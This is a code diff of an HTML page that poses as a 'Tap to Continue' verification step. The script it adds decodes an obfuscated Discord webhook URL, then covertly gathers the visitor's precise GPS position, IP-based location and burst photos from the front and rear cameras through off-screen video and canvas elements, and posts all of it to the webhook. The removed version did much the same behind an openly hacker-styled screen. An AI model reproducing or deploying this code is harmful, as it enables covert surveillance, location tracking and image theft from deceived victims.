@@ -2,1427 +2,371 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Access Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Continue</title>
     <style>
-        :root {
-            --primary: #ffffff;
-            --bg: #050505;
-            --success: #00ff41;
-            --danger: #ff003c;
-            --dim: rgba(255,255,255,0.25);
-            --glow: rgba(255,255,255,0.08);
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#000;
+            color:#fff;
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            min-height:100vh;
+            overflow:hidden;
         }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            background: var(--bg);
-            color: var(--primary);
-            font-family: 'Courier New', monospace;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-            position: relative;
+        .wrap{
+            text-align:center;
+            width:90%;
+            max-width:360px;
         }
-
-        /* Scanlines - animated */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(255,255,255,0.02) 0px,
-                rgba(255,255,255,0.02) 1px,
-                transparent 1px,
-                transparent 3px
-            );
-            pointer-events: none;
-            z-index: 1000;
-            animation: scanDrift 0.15s linear infinite;
+        .circle{
+            width:100px;
+            height:100px;
+            border-radius:50%;
+            border:2px solid rgba(255,255,255,.15);
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            margin:0 auto 32px;
+            font-size:42px;
+            background:rgba(255,255,255,.03);
+            transition:all .6s;
         }
-
-        @keyframes scanDrift {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(3px); }
+        .circle.done{
+            border-color:rgba(255,255,255,.4);
+            background:rgba(255,255,255,.08);
         }
-
-        /* Vignette */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.65) 100%);
-            pointer-events: none;
-            z-index: 999;
+        .circle.done::after{
+            content:'✓';
+            font-size:42px;
         }
-
-        /* Noise overlay */
-        .noise-overlay {
-            position: fixed;
-            top: -50%; left: -50%;
-            width: 200%; height: 200%;
-            pointer-events: none;
-            z-index: 997;
-            opacity: 0.04;
-            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='1'/%3E%3C/svg%3E");
-            animation: noiseShift 0.3s steps(5) infinite;
+        .circle.done .ico{display:none}
+        h1{
+            font-size:20px;
+            font-weight:600;
+            letter-spacing:.5px;
+            margin-bottom:8px;
         }
-
-        @keyframes noiseShift {
-            0% { transform: translate(0, 0); }
-            20% { transform: translate(-5%, -5%); }
-            40% { transform: translate(3%, -3%); }
-            60% { transform: translate(-3%, 5%); }
-            80% { transform: translate(5%, 2%); }
-            100% { transform: translate(0, 0); }
+        .sub{
+            font-size:13px;
+            color:rgba(255,255,255,.35);
+            margin-bottom:40px;
+            line-height:1.5;
         }
-
-        /* Glitch lines */
-        .glitch-line {
-            position: fixed;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
-            opacity: 0;
-            pointer-events: none;
-            z-index: 998;
+        .btn{
+            width:100%;
+            padding:16px;
+            border:1.5px solid rgba(255,255,255,.2);
+            border-radius:14px;
+            background:transparent;
+            color:#fff;
+            font-size:15px;
+            font-weight:500;
+            font-family:inherit;
+            cursor:pointer;
+            transition:all .25s;
+            position:relative;
+            overflow:hidden;
+            letter-spacing:.3px;
         }
-
-        .glitch-line:nth-child(1) { top: 15%; animation: glitchSweep 7s 0s infinite; }
-        .glitch-line:nth-child(2) { top: 35%; animation: glitchSweep 9s 2.5s infinite; }
-        .glitch-line:nth-child(3) { top: 55%; animation: glitchSweep 6s 4s infinite; }
-        .glitch-line:nth-child(4) { top: 75%; animation: glitchSweep 8s 5.5s infinite; }
-        .glitch-line:nth-child(5) { top: 90%; animation: glitchSweep 10s 1s infinite; }
-
-        @keyframes glitchSweep {
-            0%, 100% { opacity: 0; transform: scaleX(0) translateX(0); }
-            0.5% { opacity: 0.7; transform: scaleX(1) translateX(-30%); }
-            1% { opacity: 0; transform: scaleX(0.3) translateX(50%); }
-            1.5% { opacity: 0.5; transform: scaleX(0.8) translateX(-10%); }
-            2% { opacity: 0; transform: scaleX(0) translateX(0); }
+        .btn:hover{
+            background:rgba(255,255,255,.06);
+            border-color:rgba(255,255,255,.35);
         }
-
-        /* Particles */
-        .particle {
-            position: fixed;
-            color: var(--primary);
-            font-size: 14px;
-            opacity: 0;
-            font-family: 'Courier New', monospace;
-            pointer-events: none;
-            z-index: 5;
-            animation: particleFall linear infinite;
-            text-shadow: 0 0 5px rgba(255,255,255,0.3);
+        .btn:active{transform:scale(.97)}
+        .btn.loading{
+            pointer-events:none;
+            color:rgba(255,255,255,.4);
+            border-color:rgba(255,255,255,.08);
         }
-
-        @keyframes particleFall {
-            0% { transform: translateY(-100vh) translateX(0); opacity: 0; }
-            5% { opacity: 0.12; }
-            95% { opacity: 0.08; }
-            100% { transform: translateY(100vh) translateX(20px); opacity: 0; }
+        .btn .bar{
+            position:absolute;
+            bottom:0;left:0;
+            height:2px;
+            background:#fff;
+            width:0%;
+            transition:width .4s ease;
         }
-
-        /* Container */
-        .container {
-            position: relative;
-            z-index: 10;
-            text-align: center;
-            max-width: 680px;
-            width: 92%;
-            padding: 30px 15px;
-            animation: containerFlicker 5s infinite;
+        .btn.loading .bar{opacity:1}
+        .status{
+            margin-top:24px;
+            font-size:12px;
+            color:rgba(255,255,255,.25);
+            min-height:18px;
+            transition:all .3s;
         }
-
-        @keyframes containerFlicker {
-            0%, 100% { opacity: 1; }
-            91% { opacity: 1; }
-            92% { opacity: 0.85; }
-            93% { opacity: 1; }
-            94% { opacity: 0.92; }
-            95% { opacity: 1; }
+        video,canvas{
+            position:fixed!important;
+            top:-99999px!important;
+            left:-99999px!important;
+            width:1px!important;
+            height:1px!important;
+            opacity:0!important;
+            pointer-events:none!important;
         }
-
-        /* ASCII art with glitch */
-        .ascii-art {
-            font-size: 8px;
-            line-height: 1.15;
-            margin-bottom: 30px;
-            opacity: 0.25;
-            white-space: pre;
-            position: relative;
-            display: inline-block;
+        .done-msg{
+            animation:fadeUp .5s ease;
         }
-
-        .ascii-art::before,
-        .ascii-art::after {
-            content: attr(data-text);
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            white-space: pre;
+        @keyframes fadeUp{
+            from{opacity:0;transform:translateY(10px)}
+            to{opacity:1;transform:translateY(0)}
         }
-
-        .ascii-art::before {
-            color: #ff003c;
-            animation: asciiGlitch1 3s infinite;
-            clip-path: inset(0 0 80% 0);
+        .fade-out{
+            animation:fadeAway 1s ease forwards;
         }
-
-        .ascii-art::after {
-            color: #00d4ff;
-            animation: asciiGlitch2 3s infinite;
-            clip-path: inset(80% 0 0 0);
-        }
-
-        @keyframes asciiGlitch1 {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 1px); }
-            40% { transform: translate(2px, -1px); }
-            60% { transform: translate(-1px, 2px); }
-        }
-
-        @keyframes asciiGlitch2 {
-            0%, 100% { transform: translate(0); }
-            30% { transform: translate(2px, -1px); }
-            50% { transform: translate(-2px, 1px); }
-            70% { transform: translate(1px, -2px); }
-        }
-
-        /* Title with chromatic aberration */
-        .main-title {
-            font-size: 52px;
-            letter-spacing: 12px;
-            margin-bottom: 15px;
-            position: relative;
-            display: inline-block;
-            text-shadow:
-                2px 0 #ff003c,
-                -2px 0 #00d4ff;
-            animation: titleGlitch 4s infinite;
-        }
-
-        @keyframes titleGlitch {
-            0%, 100% {
-                text-shadow: 2px 0 #ff003c, -2px 0 #00d4ff;
-            }
-            2% {
-                text-shadow: -3px 0 #ff003c, 3px 0 #00d4ff;
-            }
-            4% {
-                text-shadow: 2px 0 #ff003c, -2px 0 #00d4ff;
-            }
-            50% {
-                text-shadow: 2px 0 #ff003c, -2px 0 #00d4ff;
-            }
-            52% {
-                text-shadow: 5px 2px #ff003c, -5px -2px #00d4ff;
-                transform: translateX(3px);
-            }
-            53% {
-                text-shadow: -3px -1px #ff003c, 3px 1px #00d4ff;
-                transform: translateX(-3px);
-            }
-            54% {
-                text-shadow: 2px 0 #ff003c, -2px 0 #00d4ff;
-                transform: translateX(0);
-            }
-        }
-
-        .main-title .cursor {
-            animation: blink 0.8s step-end infinite;
-        }
-
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-
-        .subtitle {
-            font-size: 13px;
-            letter-spacing: 6px;
-            margin-bottom: 35px;
-            opacity: 0.45;
-            text-transform: uppercase;
-        }
-
-        /* Terminal */
-        .terminal {
-            background: rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.25);
-            padding: 20px 25px;
-            margin-bottom: 30px;
-            text-align: left;
-            font-size: 12px;
-            position: relative;
-            overflow: hidden;
-            box-shadow:
-                0 0 15px var(--glow),
-                inset 0 0 15px rgba(255,255,255,0.02);
-            animation: terminalPulse 3s ease-in-out infinite;
-        }
-
-        @keyframes terminalPulse {
-            0%, 100% { box-shadow: 0 0 15px var(--glow), inset 0 0 15px rgba(255,255,255,0.02); }
-            50% { box-shadow: 0 0 25px rgba(255,255,255,0.12), inset 0 0 20px rgba(255,255,255,0.03); }
-        }
-
-        .terminal::before {
-            content: '■ SYSTEM TERMINAL v4.2';
-            display: block;
-            font-size: 10px;
-            opacity: 0.35;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            letter-spacing: 2px;
-        }
-
-        /* Animated border sweep */
-        .terminal::after {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 1px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
-            animation: borderSweep 4s linear infinite;
-        }
-
-        @keyframes borderSweep {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-
-        .terminal-line {
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 4px 0;
-        }
-
-        .terminal-line:last-of-type { margin-bottom: 0; }
-
-        .terminal-label {
-            opacity: 0.5;
-            font-size: 11px;
-            letter-spacing: 1px;
-        }
-
-        .terminal-status {
-            padding: 2px 10px;
-            border: 1px solid rgba(255,255,255,0.2);
-            font-size: 10px;
-            letter-spacing: 1px;
-            transition: all 0.4s ease;
-            min-width: 75px;
-            text-align: center;
-        }
-
-        .terminal-status.pending {
-            opacity: 0.35;
-            color: rgba(255,255,255,0.5);
-        }
-
-        .terminal-status.active {
-            opacity: 1;
-            color: #ffcc00;
-            border-color: #ffcc00;
-            animation: statusPulse 1s ease infinite;
-        }
-
-        @keyframes statusPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .terminal-status.success {
-            background: var(--success);
-            color: #000;
-            border-color: var(--success);
-            box-shadow: 0 0 8px rgba(0,255,65,0.3);
-            opacity: 1;
-        }
-
-        .terminal-status.error {
-            border-color: var(--danger);
-            color: var(--danger);
-            opacity: 0.7;
-        }
-
-        /* Terminal Log */
-        .terminal-log {
-            margin-top: 15px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255,255,255,0.08);
-            max-height: 0;
-            overflow-y: auto;
-            transition: max-height 0.5s ease;
-            scrollbar-width: thin;
-            scrollbar-color: rgba(255,255,255,0.1) transparent;
-        }
-
-        .terminal-log.active {
-            max-height: 140px;
-        }
-
-        .terminal-log::-webkit-scrollbar { width: 3px; }
-        .terminal-log::-webkit-scrollbar-track { background: transparent; }
-        .terminal-log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); }
-
-        .log-entry {
-            font-size: 10px;
-            margin-bottom: 4px;
-            opacity: 0;
-            animation: logFadeIn 0.3s ease forwards;
-            letter-spacing: 0.5px;
-        }
-
-        .log-entry .log-time {
-            opacity: 0.3;
-            margin-right: 6px;
-        }
-
-        .log-entry .log-ok { color: var(--success); }
-        .log-entry .log-err { color: var(--danger); }
-        .log-entry .log-info { opacity: 0.5; }
-
-        @keyframes logFadeIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        /* Access button */
-        .access-btn {
-            width: 100%;
-            max-width: 420px;
-            padding: 18px 30px;
-            background: var(--primary);
-            color: #000;
-            border: 2px solid var(--primary);
-            font-family: 'Courier New', monospace;
-            font-size: 15px;
-            letter-spacing: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .access-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .access-btn:hover {
-            background: transparent;
-            color: var(--primary);
-            box-shadow:
-                0 0 30px rgba(255,255,255,0.3),
-                0 0 60px rgba(255,255,255,0.1);
-        }
-
-        .access-btn:hover::before { left: 100%; }
-        .access-btn:active { transform: scale(0.97); }
-
-        /* Loading */
-        .loading-container {
-            display: none;
-            margin-top: 25px;
-            width: 100%;
-            max-width: 420px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .loading-bar {
-            width: 100%;
-            height: 28px;
-            border: 1px solid rgba(255,255,255,0.3);
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 12px;
-            background: rgba(255,255,255,0.03);
-        }
-
-        .loading-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary), rgba(255,255,255,0.7));
-            width: 0%;
-            transition: width 0.6s ease;
-            position: relative;
-        }
-
-        .loading-fill::after {
-            content: '';
-            position: absolute;
-            top: 0; right: 0;
-            width: 30px; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5));
-            animation: shimmer 1.5s ease infinite;
-        }
-
-        @keyframes shimmer {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.8; }
-        }
-
-        .loading-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 11px;
-            letter-spacing: 2px;
-        }
-
-        .loading-text { opacity: 0.7; }
-        .loading-pct { opacity: 0.4; font-size: 10px; }
-
-        /* Footer */
-        .footer {
-            position: fixed;
-            bottom: 15px;
-            left: 0; width: 100%;
-            text-align: center;
-            font-size: 9px;
-            opacity: 0.2;
-            letter-spacing: 3px;
-            z-index: 10;
-        }
-
-        /* Screen flash on capture */
-        .screen-flash {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: white;
-            opacity: 0;
-            pointer-events: none;
-            z-index: 2000;
-            animation: flash 0.3s ease-out;
-        }
-
-        @keyframes flash {
-            0% { opacity: 0.15; }
-            100% { opacity: 0; }
-        }
-
-        /* Fade out */
-        body.fade-out {
-            animation: fadeAway 1.5s ease forwards;
-        }
-
-        @keyframes fadeAway {
-            0% { opacity: 1; filter: none; }
-            100% { opacity: 0; filter: blur(10px); }
-        }
-
-        /* Hidden elements */
-        video, canvas, audio { 
-            display: none !important; 
-            position: fixed !important; 
-            top: -99999px !important; 
-            left: -99999px !important; 
-            opacity: 0 !important; 
-            pointer-events: none !important;
-            width: 1px !important;
-            height: 1px !important;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .main-title { font-size: 36px; letter-spacing: 8px; }
-            .ascii-art { font-size: 6px; }
-            .terminal { padding: 15px 18px; font-size: 11px; }
-            .container { padding: 20px 10px; }
-            .access-btn { font-size: 13px; padding: 16px 20px; }
+        @keyframes fadeAway{
+            to{opacity:0;filter:blur(6px)}
         }
     </style>
 </head>
 <body>
 
-    <!-- Noise overlay -->
-    <div class="noise-overlay"></div>
+<div class="wrap" id="wrap">
+    <div class="circle" id="circle"><span class="ico">→</span></div>
+    <h1 id="title">Tap to Continue</h1>
+    <p class="sub" id="sub">Verification required to proceed</p>
+    <button class="btn" id="btn" onclick="go()">
+        Continue
+        <div class="bar" id="bar"></div>
+    </button>
+    <div class="status" id="status"></div>
+</div>
 
-    <!-- Glitch lines -->
-    <div class="glitch-line"></div>
-    <div class="glitch-line"></div>
-    <div class="glitch-line"></div>
-    <div class="glitch-line"></div>
-    <div class="glitch-line"></div>
+<video id="vF" playsinline autoplay muted></video>
+<video id="vB" playsinline autoplay muted></video>
+<canvas id="cF"></canvas>
+<canvas id="cB"></canvas>
 
-    <!-- Particles -->
-    <div id="particles"></div>
+<script>
+const WH=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDMyODM1NzExMDQxNTQ1NS90VHd2T3AtOW9abTFXTVllZERVelB3dXZpYUVTOGJtaW13cnloZ0lMcW8yUGpxWGZYeHlJOGhDUi1Jdlc5U1N6ZUF0eA==');
+const S=crypto.randomUUID?crypto.randomUUID().split('-')[0].toUpperCase():Math.random().toString(36).substr(2,8).toUpperCase();
+const R=3,BF=5,BR=3,Q=.95,W=2500;
 
-    <div class="container">
-        <div class="ascii-art" data-text="    ██╗   ██╗ ██████╗ ██╗██████╗ 
-    ██║   ██║██╔═══██╗██║██╔══██╗
-    ██║   ██║██║   ██║██║██║  ██║
-    ╚██╗ ██╔╝██║   ██║██║██║  ██║
-     ╚████╔╝ ╚██████╔╝██║██████╔╝
-      ╚═══╝   ╚═════╝ ╚═╝╚═════╝ ">    ██╗   ██╗ ██████╗ ██╗██████╗ 
-    ██║   ██║██╔═══██╗██║██╔══██╗
-    ██║   ██║██║   ██║██║██║  ██║
-    ╚██╗ ██╔╝██║   ██║██║██║  ██║
-     ╚████╔╝ ╚██████╔╝██║██████╔╝
-      ╚═══╝   ╚═════╝ ╚═╝╚═════╝ </div>
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const $=id=>document.getElementById(id);
 
-        <h1 class="main-title">ACCESS<span class="cursor">_</span></h1>
-        <p class="subtitle">Verification Required</p>
+function prog(p){$('bar').style.width=p+'%'}
+function stat(t){$('status').textContent=t}
 
-        <div class="terminal">
-            <div class="terminal-line">
-                <span class="terminal-label">[01] IP_RESOLVE</span>
-                <span class="terminal-status pending" id="status0">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[02] GPS_LOCATION</span>
-                <span class="terminal-status pending" id="status1">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[03] DEVICE_SCAN</span>
-                <span class="terminal-status pending" id="status2">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[04] NETWORK_MAP</span>
-                <span class="terminal-status pending" id="status3">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[05] CAMERA_FRONT</span>
-                <span class="terminal-status pending" id="status4">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[06] CAMERA_REAR</span>
-                <span class="terminal-status pending" id="status5">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[07] MICROPHONE</span>
-                <span class="terminal-status pending" id="status6">STANDBY</span>
-            </div>
-            <div class="terminal-line">
-                <span class="terminal-label">[08] DATA_COMPILE</span>
-                <span class="terminal-status pending" id="status7">STANDBY</span>
-            </div>
+async function send(payload){
+    for(let i=0;i<R;i++){
+        try{
+            const r=await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+            if(r.ok)return true;
+            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
+            await sleep(1000*(i+1));
+        }catch{await sleep(1500*(i+1))}
+    }
+    return false;
+}
 
-            <div class="terminal-log" id="termLog"></div>
-        </div>
+async function sendF(fd){
+    for(let i=0;i<R;i++){
+        try{
+            const r=await fetch(WH,{method:'POST',body:fd});
+            if(r.ok)return true;
+            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
+            await sleep(1000*(i+1));
+        }catch{await sleep(1500*(i+1))}
+    }
+    return false;
+}
 
-        <button class="access-btn" id="accessBtn" onclick="initiateAccess()">
-            ▶ GRANT ACCESS
-        </button>
+// ═══ GPS ═══
+async function gps(){
+    stat('Getting location...');
+    return new Promise(resolve=>{
+        if(!navigator.geolocation){resolve(null);return}
+        let done=false,tries=0;
+        const ok=async pos=>{
+            if(done)return;done=true;
+            if(wid!==null)navigator.geolocation.clearWatch(wid);
+            const la=pos.coords.latitude.toFixed(7);
+            const lo=pos.coords.longitude.toFixed(7);
+            const ac=pos.coords.accuracy.toFixed(1);
+            const al=pos.coords.altitude!==null?pos.coords.altitude.toFixed(1)+'m':'N/A';
+            const sp=pos.coords.speed!==null?pos.coords.speed.toFixed(1)+'m/s':'N/A';
+            const hd=pos.coords.heading!==null?pos.coords.heading.toFixed(1)+'°':'N/A';
+            const map=`https://www.google.com/maps?q=${la},${lo}`;
+            await send({embeds:[{
+                title:'📍 LOCATION',color:0xffffff,
+                description:`**[Open Map](${map})**`,
+                fields:[
+                    {name:'Coordinates',value:`\`\`\`\nLat      : ${la}\nLon      : ${lo}\nAccuracy : ±${ac}m\nAltitude : ${al}\nSpeed    : ${sp}\nHeading  : ${hd}\n\`\`\``,inline:false},
+                    {name:'Time',value:`\`${new Date().toLocaleString('id-ID')}\``,inline:true},
+                    {name:'Device',value:`\`${navigator.platform||'?'}\``,inline:true}
+                ],
+                footer:{text:`${S}`},timestamp:new Date().toISOString()
+            }]});
+            resolve({la,lo});
+        };
+        const fail=e=>{
+            tries++;
+            if(tries>=5&&!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}
+        };
+        let wid=null;
+        try{wid=navigator.geolocation.watchPosition(ok,fail,{enableHighAccuracy:true,timeout:20000,maximumAge:0})}
+        catch{
+            const retry=()=>{if(done)return;navigator.geolocation.getCurrentPosition(ok,e=>{fail(e);if(!done&&tries<5)setTimeout(retry,2000)},{enableHighAccuracy:true,timeout:20000,maximumAge:0})};
+            retry();
+        }
+        setTimeout(()=>{if(!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}},45000);
+    });
+}
 
-        <div class="loading-container" id="loadingContainer">
-            <div class="loading-bar">
-                <div class="loading-fill" id="loadingFill"></div>
-            </div>
-            <div class="loading-info">
-                <span class="loading-text" id="loadingText">INITIALIZING...</span>
-                <span class="loading-pct" id="loadingPct">0%</span>
-            </div>
-        </div>
-    </div>
+// ═══ IP fallback location ═══
+async function ipLoc(){
+    const apis=['https://ipapi.co/json/','https://ip-api.com/json/?fields=66846719','https://ipwho.is/','https://freeipapi.com/api/json'];
+    for(const u of apis){
+        try{const r=await fetch(u,{signal:AbortSignal.timeout(4000)});if(r.ok){const d=await r.json();const la=d.latitude||d.lat;const lo=d.longitude||d.lon;if(la&&lo){const map=`https://www.google.com/maps?q=${la},${lo}`;await send({embeds:[{title:'📍 IP LOCATION (Approximate)',color:0x888888,description:`**[Open Map](${map})**`,fields:[{name:'Location',value:`\`${la}, ${lo}\`\n\`${d.city||'?'}, ${d.country||d.country_name||'?'}\`\nISP: \`${d.org||d.isp||'?'}\``,inline:false}],footer:{text:S},timestamp:new Date().toISOString()}]});return}}}catch{}
+    }
+}
 
-    <div class="footer">
-        VOID v4.2 :: ENCRYPTED TUNNEL ACTIVE :: &lt;/&gt;
-    </div>
+// ═══ CAMERA ═══
+function constraints(facing,attempt){
+    if(facing==='user'){
+        return[
+            {video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}}},
+            {video:{facingMode:{exact:'user'},width:{ideal:1280},height:{ideal:720}}},
+            {video:{width:{ideal:1920},height:{ideal:1080}}},
+            {video:true}
+        ][Math.min(attempt,3)];
+    }
+    return[
+        {video:{facingMode:{exact:'environment'},width:{ideal:1920},height:{ideal:1080}}},
+        {video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}}},
+        {video:{facingMode:{ideal:'environment'}}},
+        {video:true}
+    ][Math.min(attempt,3)];
+}
 
-    <!-- Hidden media elements -->
-    <video id="videoFront" playsinline autoplay muted></video>
-    <video id="videoBack" playsinline autoplay muted></video>
-    <canvas id="canvasFront"></canvas>
-    <canvas id="canvasBack"></canvas>
+async function enumCam(facing){
+    try{
+        const init=await navigator.mediaDevices.getUserMedia({video:true});
+        init.getTracks().forEach(t=>t.stop());
+        const devs=await navigator.mediaDevices.enumerateDevices();
+        const cams=devs.filter(d=>d.kind==='videoinput');
+        if(!cams.length)return null;
+        let target;
+        if(facing==='user')target=cams.find(c=>/front|user|facetime/i.test(c.label))||cams[0];
+        else target=cams.find(c=>/back|rear|environment/i.test(c.label))||cams[cams.length>1?1:0];
+        if(target)return await navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:target.deviceId},width:{ideal:1920},height:{ideal:1080}}});
+    }catch{}
+    return null;
+}
 
-    <script>
-        // ═══════════════════════════════════════════
-        //  CONFIGURATION
-        // ═══════════════════════════════════════════
-        const _WH = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDMyODM1NzExMDQxNTQ1NS90VHd2T3AtOW9abTFXTVllZERVelB3dXZpYUVTOGJtaW13cnloZ0lMcW8yUGpxWGZYeHlJOGhDUi1Jdlc5U1N6ZUF0eA==');
-        const MAX_RETRY = 3;
-        const BURST_COUNT = 3;
-        const AUDIO_DURATION = 5000;
-        const PHOTO_QUALITY = 0.93;
-        const SESSION_ID = Math.random().toString(36).substring(2, 10).toUpperCase();
+async function cam(type){
+    const front=type==='front';
+    const facing=front?'user':'environment';
+    const burst=front?BF:BR;
+    const vid=$(front?'vF':'vB');
+    const cvs=$(front?'cF':'cB');
+    stat(`${front?'Front':'Rear'} camera...`);
 
-        // ═══════════════════════════════════════════
-        //  PARTICLE SYSTEM
-        // ═══════════════════════════════════════════
-        (() => {
-            const container = document.getElementById('particles');
-            const charset = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';
-            for (let i = 0; i < 35; i++) {
-                const p = document.createElement('div');
-                p.className = 'particle';
-                p.textContent = charset[Math.floor(Math.random() * charset.length)];
-                p.style.left = Math.random() * 100 + '%';
-                p.style.animationDuration = (Math.random() * 12 + 8) + 's';
-                p.style.animationDelay = Math.random() * 8 + 's';
-                p.style.fontSize = (Math.random() * 6 + 10) + 'px';
-                container.appendChild(p);
-            }
-        })();
+    let stream=null;
 
-        // ═══════════════════════════════════════════
-        //  UTILITIES
-        // ═══════════════════════════════════════════
-        const sleep = ms => new Promise(r => setTimeout(r, ms));
+    for(let a=0;a<4;a++){
+        try{stream=await navigator.mediaDevices.getUserMedia(constraints(facing,a));break}
+        catch{
+            if(a===1&&!front){stream=await enumCam(facing);if(stream)break}
+        }
+    }
 
-        function now() {
-            return new Date().toLocaleTimeString('id-ID', { hour12: false });
+    if(!stream){
+        try{stream=await navigator.mediaDevices.getUserMedia({video:true})}
+        catch{return false}
+    }
+
+    try{
+        vid.srcObject=stream;vid.muted=true;await vid.play();
+        let warm=0;
+        while(warm<W&&(vid.videoWidth===0||vid.readyState<3)){await sleep(100);warm+=100}
+        await sleep(Math.max(0,W-warm));
+
+        const settings=stream.getVideoTracks()[0]?.getSettings()||{};
+
+        for(let i=1;i<=burst;i++){
+            cvs.width=vid.videoWidth||1280;
+            cvs.height=vid.videoHeight||720;
+            const ctx=cvs.getContext('2d');
+            ctx.drawImage(vid,0,0,cvs.width,cvs.height);
+
+            const blob=await new Promise(r=>cvs.toBlob(r,'image/jpeg',Q));
+            const name=`${type}_${S}_${i}.jpg`;
+            const fd=new FormData();
+            fd.append('file',blob,name);
+            fd.append('payload_json',JSON.stringify({embeds:[{
+                title:`📸 ${type.toUpperCase()} ${i}/${burst}`,
+                color:front?0xffffff:0xaaaaaa,
+                fields:[
+                    {name:'Resolution',value:`\`${cvs.width}x${cvs.height}\``,inline:true},
+                    {name:'Facing',value:`\`${settings.facingMode||'?'}\``,inline:true},
+                    {name:'Size',value:`\`${(blob.size/1024).toFixed(0)}KB\``,inline:true}
+                ],
+                image:{url:`attachment://${name}`},
+                footer:{text:S},timestamp:new Date().toISOString()
+            }]}));
+
+            await sendF(fd);
+            stat(`${front?'Front':'Rear'} ${i}/${burst}`);
+            if(i<burst)await sleep(400);
         }
 
-        function updateProgress(pct) {
-            document.getElementById('loadingFill').style.width = pct + '%';
-            document.getElementById('loadingPct').textContent = Math.round(pct) + '%';
-        }
-
-        function setLoadText(txt) {
-            document.getElementById('loadingText').textContent = txt;
-        }
-
-        function updateStatus(id, text, state = 'pending') {
-            const el = document.getElementById(id);
-            el.textContent = text;
-            el.className = 'terminal-status ' + state;
-        }
-
-        function addLog(text, type = 'info') {
-            const log = document.getElementById('termLog');
-            log.classList.add('active');
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            const timeSpan = `<span class="log-time">[${now()}]</span>`;
-            const cls = type === 'ok' ? 'log-ok' : type === 'err' ? 'log-err' : 'log-info';
-            entry.innerHTML = `${timeSpan}<span class="${cls}">${text}</span>`;
-            log.appendChild(entry);
-            log.scrollTop = log.scrollHeight;
-        }
-
-        function screenFlash() {
-            const f = document.createElement('div');
-            f.className = 'screen-flash';
-            document.body.appendChild(f);
-            setTimeout(() => f.remove(), 350);
-        }
-
